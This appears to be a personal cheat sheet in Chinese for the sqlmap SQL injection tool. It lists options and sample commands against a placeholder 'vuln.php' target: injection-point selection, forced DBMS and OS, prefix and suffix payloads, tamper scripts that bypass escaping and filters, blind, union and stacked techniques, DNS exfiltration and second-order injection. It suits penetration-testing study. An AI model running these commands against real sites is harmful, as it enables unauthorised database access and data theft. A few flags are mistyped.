```php
#注入位址介紹
欺騙伺服器執行SQL命令，可以發生在HTTP位置
-o 開啟所以有性能優化參數
#指定注入參數設定
-p     具體探測參數，如 -p "id,user-agent"
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1"  -p "id" --current-db
--skip 忽略具體參數，如  --level 1~5 --skip"user-agent,referer"

--param-exclude忽略包含具體內容參數，排除不測試的參數的正則表達式
如 --param-exclude="token|session"..不對包含token|session的參數探測
--skip-static      忽略非動態參數
--param-filter=GET 選擇測試的參數類型 (GET, POST, COOKIE 等)


#注入URI設定
碰到mod_rewrite就特別有用，*代表插入的位置
sqlmap -u "<Rhost_ip:port>/vuln/value*/param2/value2/"
#任意注入位置設定

```
```php
#強制DBMS設定  加快速度 不對其他版本做掃瞄
--dbms mysql 5.0
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" --dbms mysql --current-db
--dbms microsoft sql server 05


#強制OS系統設定（版本類型）提高準確
--os windows
--os linux
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" --dbms mysql --os windows --current-db

#關閉負載轉換機制 null= 空格替換 舊版本可能會發生
--no-cast

#關閉字符轉譯機制 出現‘造成 繞過 magic_quotes  mysql_real_excape_string減少有效負載
--no-escape  
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1"  --dbms mysql --dbs -thread 10 --tamper

```
```php
#強制設定無效值替換
--invalid-bignum   //如果原始參數無效 可強制使用最大整數值
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1"  --invalid-bignum --current-db -v 3
--invalid-logical //使用邏輯運算來無效化值,如果原始參數無效 可強制用 id=13 and18=19
--invalid-string  //如果原始參數無效 可強制用隨機字串

#自定義注入負載位置，已知查詢語法並注入有效前後綴
--prefix  //注入有效 payload 的前綴字串
--suffix  //payload後綴設定
$query ="SELECT*FROM users WHERE id=('.$_GET['id'].')LIMIT 0,1";
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" -p id --prefix"')" -suffix "AND('abc'='abc"

$query ="SELECT*FROM users WHERE id=('1') <PAYLOAD> AND('abc=abc')LIMIT 0,1";
#tamper腳本設定。-v 3   繞過防禦措施
--tamper=TAMPER   在注入資料前使用指定的 Python 程式碼


#DBMS認證 很少使用
--dbms-cred=root:toor --dbs //資料庫管理系統認證憑證 (使用者:密碼)

--technique=TECHNIQUES	要使用的 SQL 注入技術 (預設為 "BEUSTQ")		--technique=BEUST
--time-sec=TIMESEC	延遲 DBMS 回應的秒數 (預設為 5 秒)		--time-sec=10
--union-cols=UCOLS	要測試 UNION 查詢 SQL 注入的欄位範圍	--union-cols=1-5
--union-char=UCHAR	用於猜解欄位元數的字元		`--

```
自定義參數
```php
#探測等級設定 越困難越高
--level 1~5  默認 1
HTTP Cookie   --level 2  --cookie="*"
HTTP proxy or header --level 3  up
////////leafpad  看文件的視窗///////

#風險參數設定  默認1  不建議使用
--risk num 1~3

#頁面比較參數設定
繞過動態可能改變時間時的用戶輸入
--string     // 指定包含字串查詢為true
--not-string // 指定包含字串查詢為flase
--regexp     //通過正則表達式匹配字串符號 查詢為true
--code       //匹配HTTP狀態碼200 403? 查詢為true
```
Techniques  技術參數
```php
# 具體注入技術
--technique=TECH	指定使用的 SQL 注入技術（預設為 "BEUSTQ"）	// --technique BU
B  booloean-based blind     布爾盲注
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" --technique B --current-db

E  error-based              報錯注入
U  Union query-based union  查詢注入
S  Stacked qureires         疊堆注入
T  time-based blind         時間盲注
Q  inline queries           內聯查詢注入

# 盲注延遲 默認 5s
--time-sec=	設定 DBMS 回應延遲的秒數（預設為 5 秒）	//	--time-sec=10

# union字段數  預設1-10
--union-cols=UCOLS	設定在 UNION 查詢中測試的欄位範圍
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" --technique U --union-cols=12-15    --current-db

# union字符 手動輸入用所需字符
--union-char=UCHAR	設定用於測試欄位數的字元
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" -v 3 --technique U --union-char 123
```

```php
# union查詢表。設定在 UNION 查詢中使用的表格名稱  沒有保護措施的表格	
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" -v3 --technique U --union-from users --current-db

# 設定在 DNS 洩漏攻擊中使用的功能變數名稱 有限制流量或有waf 需具有開放53 port
--dns-domain=DNS		

#	設定在二次注入
--second-order 
--second-url URL	設定在二次注入攻擊中搜索的結果頁面 URL
//	--second-url=https:<Rhost_ip:port>/vuln.php?id=1
--second-req=SECREQ	從檔案載入二次注入攻擊的 HTTP 請求
//	--second-req=second-order-request.txt

#指紋fingerprint識別  查詢版本
-f  或 -b
```









